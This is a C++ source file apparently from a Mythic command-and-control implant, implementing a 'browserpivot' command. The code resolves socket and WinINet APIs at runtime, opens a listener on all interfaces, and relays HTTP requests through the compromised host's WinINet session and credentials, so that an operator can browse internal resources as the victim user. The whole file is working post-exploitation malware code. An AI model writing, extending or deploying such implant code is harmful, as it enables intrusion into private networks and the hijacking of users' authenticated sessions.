#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>
#include <browserpivot.h>

#ifdef INCLUDE_CMD_BROWSERPIVOT

using namespace stardust;
using namespace starburst;

/* ================================================================
 *  Helper - resolve WinSock + WinINet APIs into BrowserPivotState
 * ================================================================ */
static auto declfn resolve_bp_apis(
    _Inout_ instance&          inst,
    _Inout_ BrowserPivotState* state
) -> bool {

    /* --- load ws2_32.dll ---------------------------------------- */
    state->h_ws2 = reinterpret_cast<HMODULE>(
        inst.kernel32.LoadLibraryA(
            symbol<const char*>( const_cast<char*>( "ws2_32.dll" ) ) ) );

    if ( !state->h_ws2 )
        return false;

    state->ws.pWSAStartup = reinterpret_cast<bp_fn_WSAStartup>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "WSAStartup" ) ) ) );

    state->ws.psocket = reinterpret_cast<bp_fn_socket>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "socket" ) ) ) );

    state->ws.pconnect = reinterpret_cast<bp_fn_connect>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "connect" ) ) ) );

    state->ws.psend = reinterpret_cast<bp_fn_send>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "send" ) ) ) );

    state->ws.precv = reinterpret_cast<bp_fn_recv>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "recv" ) ) ) );

    state->ws.pclosesocket = reinterpret_cast<bp_fn_closesocket>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "closesocket" ) ) ) );

    state->ws.pselect = reinterpret_cast<bp_fn_select>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "select" ) ) ) );

    state->ws.pioctlsocket = reinterpret_cast<bp_fn_ioctlsocket>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "ioctlsocket" ) ) ) );

    state->ws.pWSAGetLastError = reinterpret_cast<bp_fn_WSAGetLastError>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "WSAGetLastError" ) ) ) );

    state->ws.pWSACleanup = reinterpret_cast<bp_fn_WSACleanup>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "WSACleanup" ) ) ) );

    state->ws.phtons = reinterpret_cast<bp_fn_htons>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "htons" ) ) ) );

    state->ws.pntohs = reinterpret_cast<bp_fn_ntohs>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "ntohs" ) ) ) );

    state->ws.pinet_addr = reinterpret_cast<bp_fn_inet_addr>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "inet_addr" ) ) ) );

    state->ws.pbind = reinterpret_cast<bp_fn_bind>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "bind" ) ) ) );

    state->ws.plisten = reinterpret_cast<bp_fn_listen>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "listen" ) ) ) );

    state->ws.paccept = reinterpret_cast<bp_fn_accept>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "accept" ) ) ) );

    state->ws.psetsockopt = reinterpret_cast<bp_fn_setsockopt>(
        inst.kernel32.GetProcAddress( state->h_ws2,
            symbol<LPCSTR>( const_cast<char*>( "setsockopt" ) ) ) );

    /* verify critical ws2 pointers */
    if ( !state->ws.pWSAStartup || !state->ws.psocket  ||
         !state->ws.pbind       || !state->ws.plisten   ||
         !state->ws.paccept     || !state->ws.psend     ||
         !state->ws.precv       || !state->ws.pclosesocket ||
         !state->ws.phtons      || !state->ws.pselect   ||
         !state->ws.pconnect    || !state->ws.pinet_addr ||
         !state->ws.psetsockopt || !state->ws.pWSAGetLastError ||
         !state->ws.pWSACleanup )
        return false;

    /* --- load wininet.dll --------------------------------------- */
    state->h_wininet = reinterpret_cast<HMODULE>(
        inst.kernel32.LoadLibraryA(
            symbol<const char*>( const_cast<char*>( "wininet.dll" ) ) ) );

    if ( !state->h_wininet )
        return false;

    state->inet.pInternetOpenA = reinterpret_cast<bp_fn_InternetOpenA>(
        inst.kernel32.GetProcAddress( state->h_wininet,
            symbol<LPCSTR>( const_cast<char*>( "InternetOpenA" ) ) ) );

    state->inet.pInternetOpenUrlA = reinterpret_cast<bp_fn_InternetOpenUrlA>(
        inst.kernel32.GetProcAddress( state->h_wininet,
            symbol<LPCSTR>( const_cast<char*>( "InternetOpenUrlA" ) ) ) );

    state->inet.pInternetReadFile = reinterpret_cast<bp_fn_InternetReadFile>(
        inst.kernel32.GetProcAddress( state->h_wininet,
            symbol<LPCSTR>( const_cast<char*>( "InternetReadFile" ) ) ) );

    state->inet.pInternetCloseHandle = reinterpret_cast<bp_fn_InternetCloseHandle>(
        inst.kernel32.GetProcAddress( state->h_wininet,
            symbol<LPCSTR>( const_cast<char*>( "InternetCloseHandle" ) ) ) );

    state->inet.pHttpQueryInfoA = reinterpret_cast<bp_fn_HttpQueryInfoA>(
        inst.kernel32.GetProcAddress( state->h_wininet,
            symbol<LPCSTR>( const_cast<char*>( "HttpQueryInfoA" ) ) ) );

    /* verify critical wininet pointers */
    if ( !state->inet.pInternetOpenA     || !state->inet.pInternetOpenUrlA ||
         !state->inet.pInternetReadFile  || !state->inet.pInternetCloseHandle ||
         !state->inet.pHttpQueryInfoA )
        return false;

    return true;
}

/* ================================================================
 *  Helper - extract URL from an HTTP request line
 *
 *  Input : "GET http://host/path HTTP/1.1\r\n..."
 *  Output: pointer to URL start, *url_len set to URL length
 * ================================================================ */
static auto declfn parse_http_url(
    _In_  char*     req,
    _In_  uint32_t  req_len,
    _Out_ uint32_t* url_len
) -> char* {

    *url_len = 0;
    uint32_t i = 0;

    /* skip past METHOD (find first space) */
    while ( i < req_len && req[i] != ' ' )
        i++;

    if ( i >= req_len )
        return nullptr;

    i++; /* skip the space */
    char* url_start = &req[i];

    /* find the second space (end of URL) */
    uint32_t url_begin = i;
    while ( i < req_len && req[i] != ' ' && req[i] != '\r' )
        i++;

    if ( i <= url_begin )
        return nullptr;

    *url_len = i - url_begin;
    return url_start;
}

/* ================================================================
 *  Helper - find end-of-headers marker (\r\n\r\n) in a buffer
 *  Returns offset past the marker, or 0 if not found.
 * ================================================================ */
static auto declfn find_header_end(
    _In_ const char* buf,
    _In_ uint32_t    len
) -> uint32_t {

    if ( len < 4 )
        return 0;

    for ( uint32_t i = 0; i <= len - 4; i++ ) {
        if ( buf[i]   == '\r' && buf[i+1] == '\n' &&
             buf[i+2] == '\r' && buf[i+3] == '\n' )
            return i + 4;
    }
    return 0;
}

/* ================================================================
 *  Helper - check if request method is CONNECT
 * ================================================================ */
static auto declfn is_connect_method(
    _In_ const char* req,
    _In_ uint32_t    len
) -> bool {
    if ( len < 7 )
        return false;

    return ( req[0] == 'C' && req[1] == 'O' && req[2] == 'N' &&
             req[3] == 'N' && req[4] == 'E' && req[5] == 'C' &&
             req[6] == 'T' );
}

/* ================================================================
 *  Helper - send a complete buffer over a socket
 * ================================================================ */
static auto declfn bp_send_all(
    _In_ BrowserPivotState* state,
    _In_ uintptr_t          sock,
    _In_ const char*        buf,
    _In_ uint32_t           len
) -> bool {

    uint32_t sent = 0;
    while ( sent < len ) {
        int ret = state->ws.psend( sock, buf + sent,
            static_cast<int>( len - sent ), 0 );
        if ( ret <= 0 )
            return false;
        sent += static_cast<uint32_t>( ret );
    }
    return true;
}

/* ================================================================
 *  Proxy thread - runs independently, accepts TCP connections
 *  and forwards HTTP requests through WinINet.
 * ================================================================ */
static auto WINAPI declfn bp_proxy_thread(
    _In_ LPVOID param
) -> DWORD {

    auto* state = reinterpret_cast<BrowserPivotState*>( param );
    auto& inst  = *state->inst_ptr;

    constexpr uint32_t REQ_BUF_SIZE = 8192;
    constexpr uint32_t RSP_BUF_SIZE = 8192;

    while ( InterlockedCompareExchange( &state->running, 1, 1 ) == 1 ) {

        /* ---- accept a connection ------------------------------- */
        uintptr_t client = state->ws.paccept( state->listen_sock,
            nullptr, nullptr );

        if ( client == BP_INVALID_SOCKET || client == 0 )
            continue;

        /* check running flag after accept unblocks */
        if ( InterlockedCompareExchange( &state->running, 1, 1 ) != 1 ) {
            state->ws.pclosesocket( client );
            break;
        }

        /* ---- read the HTTP request ----------------------------- */
        char* req_buf = reinterpret_cast<char*>( inst.heap_alloc( REQ_BUF_SIZE ) );
        if ( !req_buf ) {
            state->ws.pclosesocket( client );
            continue;
        }
        mem_set( req_buf, 0, REQ_BUF_SIZE );

        uint32_t total_read = 0;
        uint32_t hdr_end    = 0;

        /* read until we have the full header block */
        while ( total_read < REQ_BUF_SIZE - 1 ) {
            int n = state->ws.precv( client,
                req_buf + total_read,
                static_cast<int>( REQ_BUF_SIZE - 1 - total_read ), 0 );

            if ( n <= 0 )
                break;

            total_read += static_cast<uint32_t>( n );

            hdr_end = find_header_end( req_buf, total_read );
            if ( hdr_end > 0 )
                break;
        }

        if ( hdr_end == 0 ) {
            /* no complete header received - drop the connection */
            inst.heap_free( req_buf );
            state->ws.pclosesocket( client );
            continue;
        }

        /* ---- check for CONNECT (HTTPS tunnelling) -------------- */
        if ( is_connect_method( req_buf, total_read ) ) {
            /* V1: HTTPS CONNECT not supported - respond 501 */
            char not_impl[] = {
                'H','T','T','P','/','1','.','1',' ',
                '5','0','1',' ',
                'N','o','t',' ','I','m','p','l','e','m','e','n','t','e','d',
                '\r','\n','\r','\n', 0 };
            bp_send_all( state, client, not_impl, 33 );
            inst.heap_free( req_buf );
            state->ws.pclosesocket( client );
            continue;
        }

        /* ---- parse the URL from the request line --------------- */
        uint32_t url_len = 0;
        char* url_ptr = parse_http_url( req_buf, hdr_end, &url_len );

        if ( !url_ptr || url_len == 0 ) {
            char bad_req[] = {
                'H','T','T','P','/','1','.','1',' ',
                '4','0','0',' ',
                'B','a','d',' ','R','e','q','u','e','s','t',
                '\r','\n','\r','\n', 0 };
            bp_send_all( state, client, bad_req, 28 );
            inst.heap_free( req_buf );
            state->ws.pclosesocket( client );
            continue;
        }

        /* null-terminate the URL in-place for InternetOpenUrlA */
        char saved_char = url_ptr[url_len];
        url_ptr[url_len] = '\0';

        /* ---- locate additional headers (after first line) ------ */
        char* extra_headers     = nullptr;
        uint32_t extra_hdrs_len = 0;

        /* find end of first line */
        uint32_t first_line_end = 0;
        for ( uint32_t j = 0; j < hdr_end - 1; j++ ) {
            if ( req_buf[j] == '\r' && req_buf[j+1] == '\n' ) {
                first_line_end = j + 2;
                break;
            }
        }

        if ( first_line_end > 0 && first_line_end < hdr_end - 2 ) {
            extra_headers  = &req_buf[first_line_end];
            /* length of headers block (excluding the trailing \r\n\r\n) */
            extra_hdrs_len = ( hdr_end - 2 ) - first_line_end;
        }

        /* ---- forward the request via WinINet ------------------- */
        HINTERNET h_url = state->inet.pInternetOpenUrlA(
            state->h_internet,
            url_ptr,
            extra_headers,
            extra_hdrs_len,
            BP_INTERNET_FLAG_RELOAD | BP_INTERNET_FLAG_NO_CACHE_WRITE,
            0 );

        /* restore the character we stomped */
        url_ptr[url_len] = saved_char;

        if ( !h_url ) {
            /* WinINet could not open the URL - 502 Bad Gateway */
            char bad_gw[] = {
                'H','T','T','P','/','1','.','1',' ',
                '5','0','2',' ',
                'B','a','d',' ','G','a','t','e','w','a','y',
                '\r','\n','\r','\n', 0 };
            bp_send_all( state, client, bad_gw, 28 );
            inst.heap_free( req_buf );
            state->ws.pclosesocket( client );
            continue;
        }

        /* ---- query the response headers from WinINet ----------- */
        char* rsp_headers     = nullptr;
        unsigned long hdr_sz  = 0;
        unsigned long hdr_idx = 0;

        /* first call to get required buffer size */
        state->inet.pHttpQueryInfoA(
            h_url, BP_HTTP_QUERY_RAW_HEADERS_CRLF,
            nullptr, &hdr_sz, &hdr_idx );

        bool headers_ok = false;

        if ( hdr_sz > 0 && hdr_sz < 65536 ) {
            rsp_headers = reinterpret_cast<char*>(
                inst.heap_alloc( hdr_sz + 1 ) );

            if ( rsp_headers ) {
                mem_set( rsp_headers, 0, hdr_sz + 1 );
                hdr_idx = 0;
                if ( state->inet.pHttpQueryInfoA(
                         h_url, BP_HTTP_QUERY_RAW_HEADERS_CRLF,
                         rsp_headers, &hdr_sz, &hdr_idx ) ) {
                    headers_ok = true;
                }
            }
        }

        /* ---- send response headers to the client --------------- */
        if ( headers_ok ) {
            /* rsp_headers already contains "HTTP/1.1 200 OK\r\n...\r\n"
             * We need to append an extra \r\n to mark end of headers. */
            bp_send_all( state, client, rsp_headers, hdr_sz );

            /* send the blank line separating headers from body */
            char crlf[] = { '\r', '\n', 0 };
            bp_send_all( state, client, crlf, 2 );
        } else {
            /* fallback: minimal 200 response */
            char min_rsp[] = {
                'H','T','T','P','/','1','.','1',' ',
                '2','0','0',' ','O','K',
                '\r','\n','\r','\n', 0 };
            bp_send_all( state, client, min_rsp, 19 );
        }

        /* ---- stream the body back to the client ---------------- */
        char* rsp_chunk = reinterpret_cast<char*>( inst.heap_alloc( RSP_BUF_SIZE ) );
        if ( rsp_chunk ) {
            unsigned long bytes_read = 0;

            while ( state->inet.pInternetReadFile(
                        h_url, rsp_chunk, RSP_BUF_SIZE, &bytes_read ) ) {
                if ( bytes_read == 0 )
                    break;

                if ( !bp_send_all( state, client,
                         rsp_chunk, static_cast<uint32_t>( bytes_read ) ) )
                    break;

                bytes_read = 0;
            }

            inst.heap_free( rsp_chunk );
        }

        /* ---- cleanup this request ------------------------------ */
        state->inet.pInternetCloseHandle( h_url );

        if ( rsp_headers )
            inst.heap_free( rsp_headers );

        inst.heap_free( req_buf );
        state->ws.pclosesocket( client );
    }

    return 0;
}

/* ================================================================
 *  bp_init - start the browser-pivot proxy
 * ================================================================ */
auto declfn starburst::bp_init(
    _Inout_ instance& inst,
    _In_    uint16_t  port
) -> bool {

    auto* state = reinterpret_cast<BrowserPivotState*>(
        inst.heap_alloc( sizeof( BrowserPivotState ) ) );

    if ( !state )
        return false;

    mem_set( state, 0, sizeof( BrowserPivotState ) );
    state->inst_ptr = &inst;

    /* resolve all API pointers */
    if ( !resolve_bp_apis( inst, state ) ) {
        inst.heap_free( state );
        return false;
    }

    /* WinSock startup */
    uint8_t wsa_buf[512];
    mem_set( wsa_buf, 0, sizeof( wsa_buf ) );

    if ( state->ws.pWSAStartup( 0x0202 /* MAKEWORD(2,2) */,
             wsa_buf ) != 0 ) {
        inst.heap_free( state );
        return false;
    }

    /* open a global WinINet session with pre-configured proxy/auth */
    state->h_internet = state->inet.pInternetOpenA(
        symbol<const char*>( const_cast<char*>(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" ) ),
        BP_INTERNET_OPEN_TYPE_PRECONFIG,
        nullptr, nullptr, 0 );

    if ( !state->h_internet ) {
        state->ws.pWSACleanup();
        inst.heap_free( state );
        return false;
    }

    /* create TCP listener socket */
    uintptr_t sock = state->ws.psocket( BP_AF_INET, BP_SOCK_STREAM,
                                         BP_IPPROTO_TCP );
    if ( sock == BP_INVALID_SOCKET ) {
        state->inet.pInternetCloseHandle( state->h_internet );
        state->ws.pWSACleanup();
        inst.heap_free( state );
        return false;
    }

    /* SO_REUSEADDR so we can restart quickly */
    int reuse = 1;
    state->ws.psetsockopt( sock, BP_SOL_SOCKET, BP_SO_REUSEADDR,
        reinterpret_cast<const char*>( &reuse ), sizeof( reuse ) );

    /* bind to 0.0.0.0:<port> */
    bp_sockaddr_in addr;
    mem_set( &addr, 0, sizeof( addr ) );
    addr.sin_family = static_cast<int16_t>( BP_AF_INET );
    addr.sin_port   = state->ws.phtons( port );
    addr.sin_addr   = 0; /* INADDR_ANY */

    if ( state->ws.pbind( sock,
             reinterpret_cast<const void*>( &addr ),
             sizeof( addr ) ) == BP_SOCKET_ERROR ) {
        state->ws.pclosesocket( sock );
        state->inet.pInternetCloseHandle( state->h_internet );
        state->ws.pWSACleanup();
        inst.heap_free( state );
        return false;
    }

    if ( state->ws.plisten( sock, 10 ) == BP_SOCKET_ERROR ) {
        state->ws.pclosesocket( sock );
        state->inet.pInternetCloseHandle( state->h_internet );
        state->ws.pWSACleanup();
        inst.heap_free( state );
        return false;
    }

    state->listen_sock = sock;
    state->port        = port;
    InterlockedExchange( &state->running, 1 );

    /* launch the proxy thread */
    state->h_thread = inst.kernel32.CreateThread(
        nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>( bp_proxy_thread ),
        state, 0, nullptr );

    if ( !state->h_thread ) {
        InterlockedExchange( &state->running, 0 );
        state->ws.pclosesocket( sock );
        state->inet.pInternetCloseHandle( state->h_internet );
        state->ws.pWSACleanup();
        inst.heap_free( state );
        return false;
    }

    inst.browserpivot_state = state;
    return true;
}

/* ================================================================
 *  bp_destroy - stop the browser-pivot proxy and clean up
 * ================================================================ */
auto declfn starburst::bp_destroy(
    _Inout_ instance& inst
) -> void {

    auto* state = reinterpret_cast<BrowserPivotState*>(
        inst.browserpivot_state );

    if ( !state )
        return;

    /* signal the thread to stop */
    InterlockedExchange( &state->running, 0 );

    /* unblock accept() by connecting to the listen socket from this
     * thread - the accept call returns, thread checks running flag
     * and exits. */
    uintptr_t wake_sock = state->ws.psocket( BP_AF_INET, BP_SOCK_STREAM,
                                              BP_IPPROTO_TCP );
    if ( wake_sock != BP_INVALID_SOCKET ) {
        bp_sockaddr_in lo;
        mem_set( &lo, 0, sizeof( lo ) );
        lo.sin_family = static_cast<int16_t>( BP_AF_INET );
        lo.sin_port   = state->ws.phtons( state->port );
        lo.sin_addr   = state->ws.pinet_addr(
            symbol<const char*>( const_cast<char*>( "127.0.0.1" ) ) );

        state->ws.pconnect( wake_sock,
            reinterpret_cast<const void*>( &lo ), sizeof( lo ) );
        state->ws.pclosesocket( wake_sock );
    }

    /* wait for the proxy thread to exit */
    inst.kernel32.WaitForSingleObject( state->h_thread, 5000 );
    inst.kernel32.CloseHandle( state->h_thread );

    /* close the listen socket */
    state->ws.pclosesocket( state->listen_sock );

    /* close the WinINet session */
    state->inet.pInternetCloseHandle( state->h_internet );

    /* WinSock cleanup */
    state->ws.pWSACleanup();

    /* free state and clear pointer */
    inst.heap_free( state );
    inst.browserpivot_state = nullptr;
}

/* ================================================================
 *  cmd_browserpivot - Mythic command handler
 *
 *  Parameters (from parser):
 *    action : string  - "start" or "stop"
 *    port   : int32   - TCP port for local proxy listener
 * ================================================================ */
auto declfn starburst::cmd_browserpivot(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {

    uint32_t action_len = 0;
    auto action = parser_string( params, &action_len );

    if ( !action || action_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "missing action parameter" ) ) );
        return;
    }

    char start_str[] = { 's', 't', 'a', 'r', 't', 0 };
    char stop_str[]  = { 's', 't', 'o', 'p', 0 };

    if ( str_ncmp( action, start_str, 5 ) == 0 ) {

        /* --- START ----------------------------------------------- */
        if ( inst.browserpivot_state ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>(
                    "browser pivot already running" ) ) );
            return;
        }

        /* read the port parameter */
        uint32_t port_val = parser_int32( params );
        if ( port_val == 0 || port_val > 65535 ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>(
                    "invalid port number" ) ) );
            return;
        }

        if ( !bp_init( inst, static_cast<uint16_t>( port_val ) ) ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>(
                    "browser pivot init failed" ) ) );
            return;
        }

        /* build a success message: "browser pivot started on port XXXXX" */
        char msg_buf[64];
        mem_set( msg_buf, 0, sizeof( msg_buf ) );

        char prefix[] = {
            'b','r','o','w','s','e','r',' ',
            'p','i','v','o','t',' ',
            's','t','a','r','t','e','d',' ',
            'o','n',' ',
            'p','o','r','t',' ', 0 };

        str_copy( msg_buf, prefix );

        char port_str[8];
        mem_set( port_str, 0, sizeof( port_str ) );
        int_to_str( port_str, port_val, 10 );
        str_concat( msg_buf, port_str );

        queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg_buf );

    } else if ( str_ncmp( action, stop_str, 4 ) == 0 ) {

        /* --- STOP ------------------------------------------------ */
        if ( !inst.browserpivot_state ) {
            queue_response( inst, task_uuid, RESPONSE_ERROR,
                symbol<char*>( const_cast<char*>(
                    "browser pivot not running" ) ) );
            return;
        }

        bp_destroy( inst );

        queue_response( inst, task_uuid, RESPONSE_SUCCESS,
            symbol<char*>( const_cast<char*>(
                "browser pivot stopped" ) ) );

    } else {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>(
                "unknown action: use start or stop" ) ) );
    }
}

#endif // INCLUDE_CMD_BROWSERPIVOT
